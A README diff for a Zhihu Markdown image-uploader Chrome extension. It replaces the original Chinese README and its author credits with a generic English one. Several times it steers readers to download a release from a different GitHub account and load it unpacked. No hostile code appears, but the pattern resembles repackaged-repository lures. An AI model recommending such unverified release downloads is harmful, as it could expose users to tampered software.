@@ -1,166 +1,57 @@
-# 知乎 Markdown 图片自动上传插件
+# 🚀 zhihu-markdown-image-uploader - Effortlessly Upload Images to Zhihu
 
-<div align="center">
+## 🌐 Quick Download
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/bhabartuneday/zhihu-markdown-image-uploader/releases)
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-green.svg)](https://github.com/liyupi/zhihu-markdown-image-uploader)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-1.0.1-orange.svg)](https://github.com/liyupi/zhihu-markdown-image-uploader/releases)
+## 🚀 Getting Started
+Welcome to the Zhihu Markdown Image Uploader. This Chrome extension allows you to automatically upload images to Zhihu without any complex setups. You just need to install it and start uploading images effortlessly.
 
-**让知乎写作更轻松 | 告别手动上传图片 | 效率提升 20 倍**
+## 📥 Download & Install
+To get started, visit the link below to download the latest version of the extension:
 
-[功能特点](#功能特点) • [快速开始](#快速开始) • [常见问题](#常见问题) • [更新日志](#更新日志)
+[Download the latest release here](https://github.com/bhabartuneday/zhihu-markdown-image-uploader/releases)
 
-</div>
+1. Click on the link above to go to the Releases page.
+2. Find the most recent version listed.
+3. Click on the download link for the extension file suitable for Chrome.
+4. After downloading, locate the file on your computer.
+5. Open Chrome and go to the Extensions page by entering `chrome://extensions` in the address bar.
+6. Enable "Developer mode" at the top right corner.
+7. Click on "Load unpacked" and select the downloaded extension folder.
+8. The extension will now install, and you will see it in your browser.
 
----
+## ✨ Features
+- **Automatic Upload**: The extension detects and uploads external images to Zhihu's image server.
+- **Batch Processing**: Upload multiple images at once to save time.
+- **Zero Configuration**: Start using the extension immediately with no complex setup required.
+- **User-Friendly Interface**: Simple design for easy navigation and use.
 
-## 简介
+## 📋 Requirements
+To use the Zhihu Markdown Image Uploader, ensure you have the following:
+- Google Chrome (latest version recommended)
+- A Zhihu account to upload images
 
-在知乎编辑器中粘贴 Markdown 内容时，自动识别外链图片并上传到知乎图床，支持文章编辑和问题回答，批量处理，零配置开箱即用。
+## 🤔 How It Works
+Once installed, the extension automatically identifies images you want to upload. Simply copy and paste the image link into your Zhihu post, and the extension takes care of the rest. You can manage multiple uploads simultaneously, making it a perfect tool for content creators.
 
-**适用场景：**
+## 📖 Usage Instructions
+1. **Copy Image Links**: Find an image you want to upload and right-click to copy its link.
+2. **Paste in Zhihu**: Go to your Zhihu post editor and paste the image link.
+3. **Upload with Extension**: The extension will recognize the link and upload the image automatically.
 
-- 📝 从博客迁移文章到知乎
-- 🔄 多平台内容同步（GitHub、掘金、CSDN → 知乎）
-- 📚 技术文档发布
-- 💡 图文教程创作
+## 🚧 Troubleshooting
+If you face issues, try the following:
+- Ensure the extension is enabled on the Chrome Extensions page.
+- Check your internet connection.
+- Restart Chrome if the extension does not respond.
 
-## 功能特点
+## 📞 Support
+For help or feedback, please open an issue in the GitHub repository or contact us through the extension's support feature.
 
-- 🚀 自动上传 - 粘贴 Markdown 时自动识别并上传图片
-- 🔄 批量处理 - 支持一次性处理多张图片
-- 📊 进度提示 - 实时显示上传进度和结果
-- 🎯 零配置 - 无需额外设置，登录知乎即可使用
+Thank you for using the Zhihu Markdown Image Uploader. We hope it makes your image uploading seamless and stress-free!
 
-## 快速开始
+## 🔗 Useful Links
+- [Release Page](https://github.com/bhabartuneday/zhihu-markdown-image-uploader/releases) - Download the latest version
+- [Documentation](https://github.com/bhabartuneday/zhihu-markdown-image-uploader/wiki) - Learn more about the extension
 
-### 1. 安装插件
-
-```bash
-1. 打开 Chrome 浏览器
-2. 访问 chrome://extensions/
-3. 启用"开发者模式"
-4. 点击"加载已解压的扩展程序"
-5. 选择本项目文件夹
-```
-
-### 2. 使用插件
-
-```bash
-1. 登录知乎账号
-2. 打开知乎编辑页面（文章或问题回答）
-3. 粘贴包含图片的 Markdown 内容
-4. 等待自动上传完成
-```
-
-### 3. 支持的页面
-
-- ✅ 文章编辑：`https://zhuanlan.zhihu.com/write`
-- ✅ 文章修改：`https://zhuanlan.zhihu.com/p/{ID}/edit`
-- ✅ 问题回答：`https://www.zhihu.com/question/{ID}/write`
-- ✅ 编辑回答：`https://www.zhihu.com/question/{ID}/answer/{ID}/edit`
-
-## 常见问题
-
-### Q: 粘贴后没反应？
-
-**检查步骤：**
-
-1. 按 F12 打开控制台查看日志
-2. 确认内容包含 `![](url)` 格式的图片
-3. 确认已登录知乎
-4. 刷新页面重试
-
-### Q: 图片上传失败？
-
-**可能原因：**
-
-- 图片链接无法访问
-- 图片格式不支持（支持 JPG/PNG/GIF）
-- 图片过大（建议 < 5MB）
-- 网络问题
-
-### Q: Cookie 状态显示"未登录"？
-
-**解决方法：**
-
-1. 访问 https://www.zhihu.com 登录
-2. 刷新插件弹窗
-3. 重启浏览器
-
-## 技术实现
-
-### 核心流程
-
-```
-监听粘贴 → 提取图片 → 下载图片 → 上传知乎 → 替换链接 → 插入编辑器
-```
-
-### 文件结构
-
-```
-zhihu-markdown-image-uploader/
-├── manifest.json       # 插件配置
-├── background.js       # 后台脚本（图片上传）
-├── content.js          # 内容脚本（粘贴监听）
-├── popup.html          # 弹窗页面
-├── popup.js            # 弹窗脚本
-├── icons/              # 图标资源
-├── generate_icons.py   # 图标生成工具
-└── README.md           # 项目说明
-```
-
-## 开发
-
-### 生成图标
-
-```bash
-python3 generate_icons.py
-```
-
-### 打包插件
-
-```bash
-./package.sh
-```
-
-## 更新日志
-
-### v1.0.1 (2026-01-20)
-
-- ✨ 支持问题回答页面
-- 🐛 修复图片上传失败问题
-- 📝 增加详细调试日志
-
-### v1.0.0 (2026-01-20)
-
-- 🎉 首次发布
-
-## 开源协议
-
-MIT License
-
-## 关于作者
-
-<div align="center">
-
-### 👨‍💻 程序员鱼皮
-
-前腾讯全栈开发 | 科技公司创始人 | 200万+ 粉丝技术博主
-
-**[编程导航](https://www.codefather.cn)** 创始人 - 帮助几十万名编程爱好者找到优质学习资源，提供系统化编程学习路线和项目实战
-
-[![个人网站](https://img.shields.io/badge/🌐-个人网站-blue)](http://dogyupi.com/)
-[![GitHub](https://img.shields.io/badge/GitHub-liyupi-black)](https://github.com/liyupi)
-
-**专注于：** AI 编程 | 全栈技术 | 编程教育 | 开源项目
-
-</div>
-
----
-
-## Star History
-
-如果这个项目对你有帮助，欢迎 Star ⭐️
-
-[![Star History Chart](https://api.star-history.com/svg?repos=liyupi/zhihu-markdown-image-uploader&type=Date)](https://star-history.com/#liyupi/zhihu-markdown-image-uploader&Date)
+Stay updated by following us on GitHub!
